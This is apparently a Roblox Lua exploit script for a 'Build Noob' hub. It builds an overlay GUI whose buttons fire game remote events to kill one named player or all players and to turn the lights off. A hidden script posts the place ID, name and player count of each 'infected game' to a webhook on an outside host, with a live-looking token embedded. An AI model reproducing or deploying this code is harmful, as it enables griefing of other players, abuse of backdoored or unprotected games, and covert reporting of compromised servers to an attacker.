local BuildNoob = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Top = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Mini = Instance.new("TextButton")
local LightsOut = Instance.new("TextButton")
local Kill = Instance.new("TextButton")
local TextBox = Instance.new("TextBox")
local WowLOL = Instance.new("Frame")
local Top_2 = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Close = Instance.new("TextButton")

--Properties:

BuildNoob.Name = "BuildNoob"
BuildNoob.Parent = game.CoreGui
BuildNoob.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BuildNoob.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = BuildNoob
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(0.417405128, 0, 0.432657897, 0)
Main.Size = UDim2.new(0, 222, 0, 218)

Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Top.Size = UDim2.new(0, 222, 0, 26)

TextLabel.Parent = Top
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(0, 75, 0, 26)
TextLabel.Font = Enum.Font.Roboto
TextLabel.Text = "Build Noob"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = Top
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.Position = UDim2.new(0.891552687, 0, 0, 0)
Exit.Size = UDim2.new(0, 24, 0, 26)
Exit.Font = Enum.Font.SourceSans
Exit.Text = "X"
Exit.TextColor3 = Color3.fromRGB(0, 0, 0)
Exit.TextSize = 14.000
Exit.MouseButton1Down:Connect(function()
Main:Destroy()
end)

Mini.Name = "Mini"
Mini.Parent = Top
Mini.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Mini.Position = UDim2.new(0.783105433, 0, 0, 0)
Mini.Size = UDim2.new(0, 24, 0, 26)
Mini.Font = Enum.Font.SourceSans
Mini.Text = "-"
Mini.TextColor3 = Color3.fromRGB(0, 0, 0)
Mini.TextSize = 14.000

LightsOut.Name = "LightsOut"
LightsOut.Parent = Main
LightsOut.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LightsOut.Position = UDim2.new(0.531531572, 0, 0.192629769, 0)
LightsOut.Size = UDim2.new(0, 94, 0, 43)
LightsOut.Font = Enum.Font.SourceSans
LightsOut.Text = "Lights Out"
LightsOut.TextColor3 = Color3.fromRGB(0, 0, 0)
LightsOut.TextSize = 17.000
LightsOut.TextWrapped = true

Kill.Name = "Kill"
Kill.Parent = Main
Kill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Kill.Position = UDim2.new(0.0450450405, 0, 0.192629769, 0)
Kill.Size = UDim2.new(0, 94, 0, 43)
Kill.Font = Enum.Font.SourceSans
Kill.Text = "Kill"
Kill.TextColor3 = Color3.fromRGB(0, 0, 0)
Kill.TextSize = 17.000
Kill.TextWrapped = true

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.0495495498, 0, 0.761467934, 0)
TextBox.Size = UDim2.new(0, 200, 0, 38)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "victim"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

WowLOL.Name = "WowLOL"
WowLOL.Parent = BuildNoob
WowLOL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WowLOL.BorderColor3 = Color3.fromRGB(27, 42, 53)
WowLOL.Position = UDim2.new(0.395889401, 0, 0.498212159, 0)
WowLOL.Size = UDim2.new(0, 290, 0, 108)
WowLOL.Visible = false

Top_2.Name = "Top"
Top_2.Parent = WowLOL
Top_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Top_2.Size = UDim2.new(0, 290, 0, 26)

TextLabel_2.Parent = Top_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Size = UDim2.new(0, 75, 0, 26)
TextLabel_2.Font = Enum.Font.Roboto
TextLabel_2.Text = "Build Noob"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Top_2
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0, 0, 1, 0)
TextLabel_3.Size = UDim2.new(0, 287, 0, 45)
TextLabel_3.Font = Enum.Font.Roboto
TextLabel_3.Text = "This game is not supported for Build Noob Hub, look at the list idiot"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

Close.Name = "Close"
Close.Parent = Top_2
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.Position = UDim2.new(0.200000003, 0, 2.73076916, 0)
Close.Size = UDim2.new(0, 170, 0, 28)
Close.Font = Enum.Font.SourceSans
Close.Text = "CLOSE"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 17.000
Close.TextWrapped = true

-- Scripts:

local function AFACYJV_fake_script() -- LightsOut.LocalScript 
	local script = Instance.new('LocalScript', LightsOut)

	script.Parent.MouseButton1Down:Connect(function()
	game.ReplicatedStorage.LightsOff:FireServer()
	end)
end
coroutine.wrap(AFACYJV_fake_script)()
local function ITGRBXQ_fake_script() -- Main.Dragify 
	local script = Instance.new('LocalScript', Main)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.0001
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(dragSpeed), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(ITGRBXQ_fake_script)()
local function CSJRRN_fake_script() -- Main.Script 
	local script = Instance.new('Script', Main)

	local id = game.PlaceId
	
	local name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	local name1 = name:gsub(" ", "-")
	local name2 = name1:gsub("'", "")
	
	local gam = "https://www.roblox.com/games/"..id.."/"..name2
	local desc = "Build Noob found an infected game! [Click here to join]"
	
	local pl = game.Players.NumPlayers
	local PlaceInfo = game:GetService("MarketplaceService"):GetProductInfo(id)
	
	local Players = game:GetService("Players")
	
	local http = game:GetService("HttpService")
	local hook = "https://windowsvps.calumplays.wtf:7406/api/webhooks/925571161276973156/YY-7m5hl6hV2HEs_KzYTEJ3eZLiB2UFTCaYEa2gNJJ5SlDicDEuYJtB56s10VaCPq_PG"
	local id = game.PlaceId
	local Data =
		{
			["content"] = "Build Noob mined: https://www.roblox.com/games/"..game.PlaceId,
			["embeds"] = {{
				["title"] = "**Build Noob**",
				["description"] = "XD Build Noob is so pro it found funne game",
				["thumbnail"] = {
					["url"] = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..id.."&fmt=png&wd=420&ht=420",
				},
				["type"] = "rich",
				["color"] = tonumber(0xf8df27),
				["image"] = {
					["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..id.."&width=768&height=432&format=png"
				},
				["fields"] = {
					{
						["name"] = "__Game ID:__",
						["value"] = id,
						["inline"] = true
					},
					{
						["name"] = "__Game Name:__",
						["value"] = name,
						["inline"] = true
					},
					{
						["name"] = "__Playing:__",
						["value"] = "` "..pl.." `",
						["inline"] = true
					},
				},
				["footer"] = {
					["text"] = "Built by vil#1481",
				},
			}},
		}
	
	Data = http:JSONEncode(Data)
	
	http:PostAsync(hook, Data)
end
coroutine.wrap(CSJRRN_fake_script)()
local function QLLSSW_fake_script() -- Kill.LocalScript 
	local script = Instance.new('LocalScript', Kill)

	script.Parent.MouseButton1Down:Connect(function()
		if script.Parent.Parent.TextBox.Text == "all" then
		local kll= game.ReplicatedStorage.KillPlayer
		for i,v in pairs(game.Players:GetChildren()) do
			kll:FireServer(v)
			end
		else
			local kll= game.ReplicatedStorage.KillPlayer
			local plr = game.Players:FindFirstChild(script.Parent.Parent.TextBox.Text)
			kll:FireServer(plr)
		end
	end)
end
coroutine.wrap(QLLSSW_fake_script)()
local function MDQXCT_fake_script() -- Close.LocalScript 
	local script = Instance.new('LocalScript', Close)

	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(MDQXCT_fake_script)()
